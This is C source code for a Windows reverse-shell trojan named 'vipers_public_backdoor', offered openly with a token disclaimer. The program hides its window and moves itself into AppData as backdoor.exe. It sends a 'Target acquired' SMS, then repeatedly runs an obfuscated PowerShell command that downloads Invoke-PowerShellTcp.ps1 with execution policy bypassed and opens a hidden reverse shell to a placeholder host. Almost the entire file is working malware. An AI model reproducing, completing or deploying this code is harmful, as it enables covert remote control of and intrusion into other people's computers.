/*
 * Application:  vipers_public_backdoor.exe -> Intermediate Reverse Shell Trojan
 *
 * Author:      VPR
 * Created:     April 10, 2021
 * Modified:    November 18, 2021
 *
 * Brief:
 *     This is an Intermediate level program that I 
 *     created.
 *
 *     It CAN move itself into the user's AppData/Roaming
 *     and change it's file attributes to hidden, so if you execute
 *     on yourself, that's where you will end up finding it.
 *
 *
 * Disclaimer:
 *     I won't take any responsibility for any crimes or 
 *     malicious activity used with either fragments or sections of 
 *     this source code. Don't be an idiot.
 */

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define CBUFFSIZE 0x0400
#define SBUFFSIZE 0x2000

int IsInTargetPath(char* path);
int IsConnectedToServer(void);
int IsTempFile(char* path);
int MoveSelf(char* path);
int Reboot(void);

char* CeasarCypher(char* text);
char* GetFileName(char* path);

void BuildGlobalCommand(char* command);
void SendNotification(void);
void HideWindow(void);
void HideFile(void);

int main(int argc, char* argv[])
{
    HideWindow();
    (void)argc;

    int attempts;
    char file_name[MAX_PATH];
    char command[CBUFFSIZE];

    snprintf(file_name, sizeof(file_name), "%s", argv[0]);
    if (!IsInTargetPath(file_name) && !IsTempFile(file_name))
    {
        MoveSelf(file_name);        // Moves the file to appdata as "backdoor.exe".
        // HideFile();              // Uncomment to change the file to hidden.

        return Reboot();            // Reloads the application and exits current process.
    }

    BuildGlobalCommand(command);
    SendNotification();

    attempts = 0;
    while (attempts < 5)            // You should adjust as desired.
    {
        if (IsConnectedToServer())  // If listening server is active...
        {
            system(command);        // Attempts to download a Powershell script.
        }

        Sleep(60000);
        ++attempts;
    }

    return 0;
}

int IsInTargetPath(char* path)
{
    if (*path != 'C')
    {
        return 0;
    }

    size_t size = strlen(path);
    for (size_t i = 0; i < size; i++)
    {
        if (!(strncmp(path+i, "AppData", strlen("AppData"))))
        {
            return 1;
        }
    }

    return 0;
}

/**
 *    This would be where you change hname to the host name
 *    of your port forwarding service to your listening service 
 *    OR simply your listening service.
**/
int IsConnectedToServer(void)
{
    WSADATA        wsaData;
    SOCKADDR_IN    sock_addr;
    SOCKET         sock;
    WORD           wVersionRequested;
    PHOSTENT       host;
    BOOL           nDataLength;
    BOOL           rv;
    CHAR           buffer[SBUFFSIZE];
    LPCSTR         hname = "example.host.com";

    wVersionRequested = MAKEWORD(2, 2);
    if ((rv = WSAStartup(wVersionRequested, &wsaData)) != EXIT_SUCCESS)
    {
        return 0;
    }

    host = gethostbyname(hname);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sock_addr.sin_port = htons(80);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = *((DWORD *)host->h_addr);
    if ((rv = connect(sock, (SOCKADDR *)(&sock_addr), sizeof(sock_addr))) != EXIT_SUCCESS)
    {
        return 0;
    }

    send(sock,
         "GET / HTTP/1.1\r\nHost: example.website.com\r\nConnection: close\r\n\r\n",
         strlen("GET / HTTP/1.1\r\nHost: example.website.com\r\nConnection: close\r\n\r\n"),
         0);

    while ((nDataLength = recv(sock, buffer, SBUFFSIZE, 0)) > 0)
    {
        int i = 0;
        while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r')
        {
            if (!strncmp(buffer + i, "EXAMPLE_TEST_CASE", strlen("EXAMPLE_TEST_CASE")))
            {
                closesocket(sock);
                WSACleanup();
                return 0;
            }
            i++;
        }
    }

    closesocket(sock);
    WSACleanup();
    return 1;
}

int IsTempFile(char* path) // TODO
{
    size_t size = strlen(path);
    for (size_t i = 0; i < size; i++)
    {
        if (!(strncmp(path+i, "Microsoft", strlen("Microsoft"))))
        {
            return 1;
        }
    }

    return 0;
}

int MoveSelf(char* path) // TODO
{
    char command[CBUFFSIZE] = { 0 };
    snprintf(command, sizeof(command),
            "cmd /min /c \"move %s %%APPDATA%%\\backdoor.exe\"", path);

    return system(command);
}

int Reboot(void) // TODO
{
    char command[CBUFFSIZE];

    memset(command, 0, sizeof(command));
    snprintf(command, sizeof(command), "cmd /c %%APPDATA%%\\backdoor.exe");

    return system(command);
}

char* CeasarCypher(char* text) // TODO improve this
{
    char* decrypted_string;
    size_t size;

    decrypted_string = (char *)calloc(strlen(text), sizeof(char));
    size = strlen(text);

    for (unsigned i = 0; i < size; i++)
    {
        decrypted_string[i] = text[i] - 1;
    }
    
    return decrypted_string;
}

char* GetFileName(char* path) // TODO improve this
{
    LPSTR result = (char *)malloc(strlen(path) + 1);
    CHAR  buffer[CBUFFSIZE];
    int   i;
    int   j;

    // TODO def
    i = 0;
    j = strlen(path) - 1;
    while (j > 0)
    {
        if (path[j] == '\\' || path[j] == '/')
        {
            break;
        }
        buffer[i] = path[j];

        i++;
        j--;
    }

    // TODO def
    i = 0;
    j = strlen(buffer) - 1;
    while (i < j)
    {
        buffer[i] ^= buffer[j];
        buffer[j] ^= buffer[i];
        buffer[i] ^= buffer[j];

        i++;
        j--;
    }
    strcpy(result, buffer); // TODO

    return result;
}

void BuildGlobalCommand(char command[CBUFFSIZE])
{
    // IP & port redacted for obvious reasons... I did
    // use a DNS though. I also used a TCP forwarding
    // service in order to globalize my access to the target.
    
    LPCSTR ip          = "127.0.0.1";   
    LPCSTR tcp         = "127.0.0.1";   
    LPCSTR port        = "8080";              

    LPCSTR flags       = "-NoLogo -ExecutionPolicy Bypass -WindowStyle Hidden ";
    LPCSTR ip_prefix   = "iex (New-Object Net.WebClient).DownloadString('http://";
    LPCSTR tcp_prefix  = "/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPaddress ";
    LPCSTR port_prefix = " -Port ";
    CHAR   buffer[CBUFFSIZE];
    
    snprintf(buffer,
             sizeof(buffer),
             "%s %s%s%s%s%s%s%s",
             CeasarCypher((char*)"qpxfstifmm"), // Simple Caesar cypher
             flags,
             ip_prefix, ip,
             tcp_prefix, tcp,
             port_prefix, port );

    // Write to original command
    for (int i = 0; buffer[i] != '\0'; i++)
    {
        command[i] = buffer[i];
    }

    return;
}

void SendNotification(void)
{
    WSADATA        wsaData;
    WORD           wVersionRequested;
    PHOSTENT       host;
    SOCKET         sock;
    SOCKADDR_IN    sock_addr;
    LPCSTR         hname = "api.smsglobal.com";
    LPCSTR         user = "USER";                 
    LPCSTR         pass = "PASSWORD";
    LPCSTR         from = "FROM";        
    LPCSTR         rece = "TO";     
    LPCSTR         text = "Target%20acquired.";
    CHAR           request[SBUFFSIZE];

    wVersionRequested = MAKEWORD(2, 2);
    if (WSAStartup(wVersionRequested, &wsaData) != EXIT_SUCCESS)
    {
        return;
    }

    host = gethostbyname(hname);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sock_addr.sin_port = htons(80);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = *((DWORD *)host->h_addr);
    if (connect(sock, (SOCKADDR *)(&sock_addr), sizeof(sock_addr)) != 0)
    {
        return;
    }

    memset(request, 0, sizeof(request));
    snprintf(request,
             SBUFFSIZE,
             "GET /http-api.php?action=sendsms&user=%s"
             "&password=%s&from=%s&to=%s&text=%s\r\n HTTP/1.1\r\n"
             "Host: %s\r\nConnection: Close\r\n\r\n", 
             user,
             pass,
             from,
             rece,
             text,
             hname);

    send(sock, request, strlen(request), 0);

    closesocket(sock);
    WSACleanup();
}

void HideWindow(void) // TODO
{
    AllocConsole();
    HWND hidden = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hidden, 0);

    return;
}

void HideFile(void) // TODO
{
    char command[CBUFFSIZE] = "attrib +h %APPDATA%\\backdoor.exe";
    system(command);

    return;
}
